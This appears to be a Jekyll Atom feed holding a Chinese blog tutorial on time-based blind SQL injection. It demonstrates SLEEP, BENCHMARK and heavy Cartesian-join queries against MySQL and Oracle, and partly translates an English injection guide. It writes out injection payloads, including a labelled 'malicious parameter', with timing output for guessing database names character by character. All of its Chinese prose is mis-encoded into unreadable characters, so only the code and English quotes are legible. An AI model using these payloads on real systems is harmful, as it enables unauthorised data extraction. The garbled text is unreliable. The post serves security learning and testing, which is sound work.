<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-16T11:30:15+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sueisok</title><subtitle>Notes,Thoughts and Else</subtitle><author><name>true</name></author><entry><title type="html">SQLæ³¨å…¥-æ—¶é—´ç›²æ³¨æ•´ç†</title><link href="http://localhost:4000/blog/sqli-time-based/" rel="alternate" type="text/html" title="SQLæ³¨å…¥-æ—¶é—´ç›²æ³¨æ•´ç†" /><published>2020-04-16T11:26:08+08:00</published><updated>2020-04-16T11:26:08+08:00</updated><id>http://localhost:4000/blog/sqli-time-based</id><content type="html" xml:base="http://localhost:4000/blog/sqli-time-based/">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#ä¸€äº›çŒœæ•°æ®åº“æ—¶ç”¨åˆ°çš„å‡½æ•°&quot; id=&quot;markdown-toc-ä¸€äº›çŒœæ•°æ®åº“æ—¶ç”¨åˆ°çš„å‡½æ•°&quot;&gt;ä¸€äº›çŒœæ•°æ®åº“æ—¶ç”¨åˆ°çš„å‡½æ•°&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sleep&quot; id=&quot;markdown-toc-sleep&quot;&gt;SLEEP&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#benchmark&quot; id=&quot;markdown-toc-benchmark&quot;&gt;BENCHMARK&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#heavy-query&quot; id=&quot;markdown-toc-heavy-query&quot;&gt;Heavy Query&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#principle&quot; id=&quot;markdown-toc-principle&quot;&gt;Principle&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#mysql-or-sql-server&quot; id=&quot;markdown-toc-mysql-or-sql-server&quot;&gt;MySQL or SQL Server&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#oracle&quot; id=&quot;markdown-toc-oracle&quot;&gt;Oracle&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#additionnal-information&quot; id=&quot;markdown-toc-additionnal-information&quot;&gt;Additionnal Information&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#get_lock&quot; id=&quot;markdown-toc-get_lock&quot;&gt;GET_LOCK&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#æ­£åˆ™è¡¨è¾¾å¼&quot; id=&quot;markdown-toc-æ­£åˆ™è¡¨è¾¾å¼&quot;&gt;æ­£åˆ™è¡¨è¾¾å¼&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#insert-å’Œ-update-çš„ç›²æ³¨&quot; id=&quot;markdown-toc-insert-å’Œ-update-çš„ç›²æ³¨&quot;&gt;insert å’Œ update çš„ç›²æ³¨&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#refer&quot; id=&quot;markdown-toc-refer&quot;&gt;Refer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç›²æ³¨ï¼Œç»æˆ‘ç†è§£å°±æ˜¯åœ¨æœåŠ¡ç«¯ä¸å¯ä»¥ç›´æ¥è¿”å›æ•°æ®çš„æ—¶å€™ï¼Œæ‘¸ç´¢å¯ä»¥åŒºåˆ«æœåŠ¡å™¨æ‰§è¡Œç»“æœçš„æ–¹æ³•ã€‚&lt;/p&gt;

&lt;h1 id=&quot;ä¸€äº›çŒœæ•°æ®åº“æ—¶ç”¨åˆ°çš„å‡½æ•°&quot;&gt;ä¸€äº›çŒœæ•°æ®åº“æ—¶ç”¨åˆ°çš„å‡½æ•°&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;length(a)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;è¿”å›açš„é•¿åº¦&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select length(database());
+--------------------+
| length(database()) |
+--------------------+
|                  4 |
+--------------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;left(a,b)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ä»å·¦ä¾§æˆªå–açš„å‰bä½&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select left(database(),1);
+--------------------+
| left(database(),1) |
+--------------------+
| t                  |
+--------------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;substr(a,b,c)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;æˆªå–aï¼Œä»bå¼€å§‹ï¼Œé•¿åº¦ä¸ºc&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select substr(database(),1,2);
+------------------------+
| substr(database(),1,2) |
+------------------------+
| te                     |
+------------------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;mid(a,b,c)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å’ŒsubstråŸç†ä¸€æ ·&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select mid(database(),1,2);
+---------------------+
| mid(database(),1,2) |
+---------------------+
| te                  |
+---------------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;ascii(a)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;è¾“å‡ºaçš„asciiç å¦‚æœaæ˜¯å­—ç¬¦ä¸²ï¼Œè¾“å‡ºaå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç &lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select ascii(substr(database(),2,3));
+-------------------------------+
| ascii(substr(database(),2,3)) |
+-------------------------------+
|                           101 |
+-------------------------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;ord(a)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å’ŒasciiåŸç†ä¸€æ ·&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select ord('a');
+----------+
| ord('a') |
+----------+
|       97 |
+----------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://sueisok.github.io/blog/sqli-trick/#ifexpr1expr2expr3&quot;&gt;if&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://sueisok.github.io/blog/sqli-trick/#ifnullexpr1expr2&quot;&gt;ifnull&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://sueisok.github.io/blog/sqli-trick/#eltnstr1str2&quot;&gt;elt&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://sueisok.github.io/blog/sqli-trick/#fieldstrstr1str2&quot;&gt;field&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;sleep&quot;&gt;SLEEP&lt;/h1&gt;

&lt;p&gt;sleepå‡½æ•°æ‹¬å·é‡Œçš„å†…å®¹å°±æ˜¯æ—¶é—´&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select sleep(1);
+----------+
| sleep(1) |
+----------+
|        0 |
+----------+
1 row in set (1.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;åˆ¤æ–­å½“å‰è¡¨è¡Œæ•°&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Vorname = sleep(1);
+---------+------------+-----+
| Vorname | Nachname   | Alt |
+---------+------------+-----+
| Lina    | Schneider  |  22 |
| Lara    | Zhang      |  20 |
| Patric  | Wang       |  23 |
| Tobias  | Alexandria |  22 |
+---------+------------+-----+
4 rows in set, 4 warnings (4.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;åˆ¤æ–­æ•°æ®åº“ä½æ•°&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;æŠŠsleepæ”¾åˆ°ifé‡Œ&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select if(length(database())=4,sleep(2),null)a;
+------+
| a    |
+------+
|    0 |
+------+
1 row in set (2.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;é€ä½çŒœè§£æ•°æ®åº“å&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;æŠŠifæ”¾åˆ°sleepé‡Œ&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select sleep(if(left(database(),1)='t',1,0))a;
+---+
| a |
+---+
| 0 |
+---+
1 row in set (1.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è¿˜å¯ä»¥åœ¨sleepé‡Œåšè¿ç®—(payloadæ¥è‡ªsqlmap)ï¼Œ3-1=2ç§’&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select sleep(3-if(left(database(),1)='t',1,0))a;
+---+
| a |
+---+
| 0 |
+---+
1 row in set (2.00 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åŒç†çŒœè§£æ•°æ®è¡¨åï¼ŒçŒœè§£æ•°æ®ç­‰ç­‰&lt;/p&gt;

&lt;h1 id=&quot;benchmark&quot;&gt;BENCHMARK&lt;/h1&gt;

&lt;p&gt;benchmarkæ˜¯åŸºå‡†çš„æ„æ€ï¼Œå¯ä»¥ç”±ç”¨æˆ·æŒ‡å®šæ‰§è¡Œä¸€ä¸ªsqlè¯­å¥æˆ–sqlè¡¨è¾¾å¼çš„æ—¶é—´ï¼Œé€šè¿‡æ‰§è¡Œå¤§è§„æ¨¡æ¬¡æ•°ï¼Œè·å¾—æ¯”è¾ƒç¨³å®šçš„sqlæ‰§è¡Œæ—¶é—´&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BENCHMARK(count,expr)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;count&lt;/strong&gt;æ˜¯æ‰§è¡Œæ¬¡æ•°ï¼Œ&lt;strong&gt;exr&lt;/strong&gt;æ˜¯è¦æ‰§è¡Œçš„è¯­å¥æ‰§è¡Œä¸€æ¬¡&lt;strong&gt;sha(1)&lt;/strong&gt;æ—¶å¯èƒ½å¾®ä¸è¶³é“ï¼Œæ‰§è¡Œ10000000æ¬¡&lt;strong&gt;sha(1)&lt;/strong&gt;çš„æ—¶é—´å°±å¯ä»¥é€ æˆå»¶æ—¶&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select Alt from vorname where Vorname='Lina' and benchmark(100,sha(1));
Empty set (0.00 sec)

mysql&amp;gt; select Alt from vorname where Vorname='Lina' and benchmark(10000000,sha(1));
Empty set (2.72 sec)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯ä»¥ç»“åˆ&lt;strong&gt;andçŸ­è·¯è¿ç®—è§„åˆ™&lt;/strong&gt;è¿›è¡Œæ—¶é—´ç›²æ³¨&lt;/p&gt;

&lt;h1 id=&quot;heavy-query&quot;&gt;Heavy Query&lt;/h1&gt;

&lt;p&gt;æœ‰çš„åœ°æ–¹ä¼šå«&lt;strong&gt;ç¬›å¡å„¿ç§¯&lt;/strong&gt;æˆ–è€…&lt;strong&gt;å¤šè¡¨è”åˆæŸ¥è¯¢&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å…ˆç¿»è¯‘ä¸€ç¯‡&lt;a href=&quot;https://www.sqlinjection.net/heavy-query/&quot;&gt;SQLæ³¨å…¥ç½‘ç«™çš„æ–‡ç« &lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Using heavy queries instead of time delays&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åˆ©ç”¨å¤§é‡çš„æŸ¥è¯¢ä»£æ›¿æ—¶é—´å»¶è¿Ÿ&lt;/p&gt;

&lt;p&gt;ï¼ˆæ¬¸ï¼Œæ„Ÿè§‰benchmarkä¹Ÿæ˜¯è¿™ä¸ªåŸç†ï¼Œåˆ©ç”¨å¤§é‡æ‰§è¡Œä¸€ä¸ªsqlè¯­å¥çš„æ—¶é—´è¿›è¡Œå»¶è¿Ÿ&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;For different reasons, it might happen that it is impossible to use time delay functions or procedures in order to achieve a &lt;a href=&quot;https://www.sqlinjection.net/time-based/&quot;&gt;classic time delay injection&lt;/a&gt;. In these situations, the best option is to simulate it with a &lt;strong&gt;heavy query that will take noticeable time to get executed by the database engine&lt;/strong&gt;. This article shows how it can be done and it presents an example for the main DBMS.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ç”±äºä¸åŒçš„åŸå› ï¼Œæœ‰æ—¶ä¸ä¼šç”¨å»¶æ—¶å‡½æ•°æˆ–ç¨‹åºè¾¾åˆ°ç»å…¸çš„å»¶æ—¶æ³¨å…¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ€å¥½çš„æ–¹æ³•å°±æ˜¯å°†ä»–ä¸å¤§é‡æŸ¥è¯¢ç»“åˆï¼Œä½¿å¾—æ•°æ®åº“å¼•æ“æ‰§è¡Œæ—¶æ¶ˆè€—ä¸€ä¸ªå¯è§çš„æ—¶é—´ã€‚è¿™ç¯‡æ–‡ç« ä¼šå±•ç¤ºè¿™æ˜¯å¦‚ä½•åšåˆ°çš„ï¼Œå¹¶ä¸¾ä¸€ä¸ªæ•°æ®åº“çš„ä¾‹å­ã€‚&lt;/p&gt;

&lt;h2 id=&quot;principle&quot;&gt;Principle&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;The injected query should not rely on user tables since in most cases the attacker will have no information about those yet. Queries presented in the following section rely on system tables. The execution time is essentially caused by the large number of lines returned.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…è¿˜æ²¡æœ‰æŒæ¡å…³äºæ•°æ®åº“æˆ–è¡¨çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æŸ¥è¯¢è¯­å¥ä¸åº”è¯¥æ˜¯ä¾èµ–äºæ•°æ®è¡¨çš„ï¼Œä¸‹é¢ä¸¾ä¾‹çš„æŸ¥è¯¢ä¾èµ–äºç³»ç»Ÿæ•°æ®è¡¨ï¼Œæ‰§è¡Œæ—¶é—´äº‹å®ä¸Šæ˜¯å¤§é‡çš„æ‰§è¡Œé€ æˆçš„ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Keep in mind that the time to execute each query presented in this article &lt;strong&gt;can tremendously vary depending on the number of rows&lt;/strong&gt; contained or returned by the table (or view). This number can be influenced by many factors like: the permissions of your user, the size of the database, the server performance, etc. You should begin with a query joining 2 tables and slowly increment until you can generate an acceptable delay.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;éœ€è¦äº†è§£çš„æ˜¯ï¼Œè¿™ç¯‡æ–‡ç« ä¸¾ä¾‹çš„æ‰§è¡Œè¯­å¥çš„æ—¶é—´ï¼Œå¯èƒ½åƒå·®ä¸‡åˆ«ï¼Œå–å†³äºè¡Œçš„æ•°é‡æˆ–è€…è¿”å›çš„è¡¨æ ¼ã€‚è¿™ä¸ªæ•°å¯ä»¥è¢«è®¸å¤šæ–¹é¢å½±å“ï¼šç”¨æˆ·çš„æƒé™ã€æ•°æ®åº“çš„å¤§å°ã€æœåŠ¡å™¨çš„æ€§èƒ½ç­‰ç­‰ã€‚ä½ åº”è¯¥ä»¥ä¸¤ä¸ªè¡¨çš„è”åˆè¯­å¥å¼€å§‹ï¼Œæ…¢æ…¢å¢åŠ ç›´åˆ°å¯æ¥å—çš„å»¶æ—¶ã€‚&lt;img src=&quot;../../assets/blog_pic/20200416_sqli_time_based/Heavy-Query-Steps.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;mysql-or-sql-server&quot;&gt;MySQL or SQL Server&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Chances are low that you have to use the heavy query approach in MySQL or SQL Server since these DBMS make it relatively easy to inject classic code delays in a vulnerable field. However, it could still happen if, for example, &lt;strong&gt;some function or characters are blacklisted&lt;/strong&gt;. Here is an example of heavy query that would work fine on SQL Server and on MySQL (version 5 or more).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ä½ ä¸å¾—ä¸ä½¿ç”¨å¤§é‡çš„æŸ¥è¯¢çš„æƒ…å†µè¿˜æ˜¯å¾ˆå°‘çš„ï¼Œå› ä¸ºMySQLæˆ–SQL Severè¿™æ ·çš„æ•°æ®åº“å¾ˆå®¹æ˜“è¢«ç»å…¸çš„å»¶æ—¶æ³¨å…¥ã€‚å½“ç„¶ï¼Œå¦‚æœä¸€äº›å‡½æ•°æˆ–å­—ç¬¦æ˜¯é»‘åå•è¿‡æ»¤çš„ï¼Œè¿™ä¸ªä¾‹å­å°±å¯ä»¥å¾ˆå¥½å¾—åœ¨MySQLå’ŒSQL Severä½¿ç”¨ï¼ˆç‰ˆæœ¬éœ€è¦å¤§äº5ï¼‰&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HEAVY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MYSQL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUERY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;C&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;In my test environment, the query above returns 594823321 and takes about 10 seconds to execute. Letâ€™s now see how it could be used to identify if a vulnerability is present.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;åœ¨æˆ‘çš„å®éªŒç¯å¢ƒä¸­ï¼Œä»¥ä¸ŠæŸ¥è¯¢è¿”å›ç»“æœä¸º594823321ï¼ŒèŠ±è´¹10ç§’ï¼Œé‚£ä¹ˆæ¥çœ‹ä¸€ä¸‹ä»–æ˜¯æ€ä¹ˆç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨çš„ã€‚&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;MALICIOUS&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;PARAMETER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 

&lt;span class=&quot;n&quot;&gt;QUERY&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;GENERATED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;columns&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;If the server response takes more time, a vulnerability is probably present. Otherwise we can conclude the field is safe.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;å¦‚æœæœåŠ¡å™¨å“åº”èŠ±è´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œé‚£ä¹ˆå¯èƒ½æ˜¯å­˜åœ¨æ¼æ´çš„ï¼Œå¦åˆ™ä½ å¯ä»¥å¾—å‡ºç»“è®ºï¼Œæ­¤å¤„æ˜¯å®‰å…¨çš„ã€‚&lt;/p&gt;

&lt;h2 id=&quot;oracle&quot;&gt;Oracle&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;As explained in the article about &lt;a href=&quot;https://www.sqlinjection.net/time-based/&quot;&gt;time-based attacks&lt;/a&gt;, in most cases you will need to use heavy queries in order to achieve this kind of SQL injection. Below is an example of query that takes a lot of time to be executed in this DBMS.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;æ­£å¦‚è¿™ç¯‡æ–‡ç« é˜é‡Šçš„ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ä½ éœ€è¦ä½¿ç”¨å¤§é‡æŸ¥è¯¢æ¥è¾¾åˆ°å¯¹Oracleæ•°æ®åº“çš„æ³¨å…¥ã€‚ä¸‹é¢å°±æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œåœ¨Oracleä¸­ç”¨å¤§é‡æ—¶é—´æ¥æ‰§è¡ŒæŸ¥è¯¢ã€‚&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;HEAVY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ORACLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUERY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;C&lt;/span&gt;
